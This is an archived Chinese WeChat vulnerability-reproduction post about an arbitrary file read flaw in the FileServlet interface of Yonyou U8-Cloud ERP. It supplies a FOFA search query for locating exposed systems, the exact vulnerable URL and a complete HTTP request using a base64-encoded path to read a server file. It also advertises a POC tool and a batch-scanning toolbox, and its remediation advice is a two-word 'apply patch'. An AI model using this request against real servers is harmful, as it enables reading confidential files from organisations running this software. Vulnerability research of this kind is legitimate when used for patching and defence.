---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  用友U8-Cloud FileServlet接口存在任意文件读取漏洞   
南风徐来  南风漏洞复现文库   2024-04-01 23:12  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友U8-Cloud简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友U8 Cloud 提供企业级云ERP整体解决方案，全面支持多组织业务协同，实现企业互联网资源连接。U8 Cloud 亦是亚太地区成长型企业最广泛采用的云解决方案。  
## 2.漏洞描述  
  
U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统存在任何文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友U8-Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLdcEd6ibXmY33FreFQbiceO22wHndU3STxibvLgT3bEauA3OSgs2a159cg/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友U8-Cloud FileServlet接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="用友-U8-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ==  
  
漏洞数据包：  
```
GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
QzovL3dpbmRvd3Mvd2luLmluaQ== 是C://windows/win.ini 的base64编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLIIejOu6yk0pSaxZHWaomxibByrFfldkFibwvB9cu6HibjHE2iaiaO9SwIeA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现112 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICL4bQk63DDAg0IbpYCWQHk3KCuQH6IgibpMVyuHCoGqIX6lsRJc6ysSQg/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLXzP4nK0ia0oa3xRh2EdfhLIGjqjl9e7YHKycwxS8JhiaxvUDprX1JCFQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICL7myklJsNWEB6Y7569ox5o8FDgs6bYpPKopUyXYJU9aQ8IgkTHQ47vQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLr61RuKTkOwicwX4S3jJgGpX9SS62dFD1RfGd95klPdIu6zhITDZMkuA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLo0J6cyWYepX6QxnFYxrymcxsQU9moQrA130sFXvNukic0o3JcAU790A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLkesicx57puCwGtenUDMUNhwVEVJWT4JpwKjhk691Bll35CRxH5ibb0Ng/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLQgNp9odzpWEDKjLFF0jxiajXBXv67SE04ibeOCeDaqiaoa2KpFlj9ZlTQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[用友NC Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485943&idx=1&sn=2287057cc4406b125320ea4c2e730c80&chksm=974b84f0a03c0de6ff44c88c20b5dc22cb748234bdf640fefb12feb3815f17d97e071dc7fe64&scene=21#wechat_redirect)  
  
  
[大华DSS Digital Surveillance System系统login_login.action存在远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485929&idx=1&sn=a7b531bc8c31e30449d23fb2508bba27&chksm=974b84eea03c0df82ac99414eae0e5c93563e9fcabbad855714aff318adba1ab281ad73597c5&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
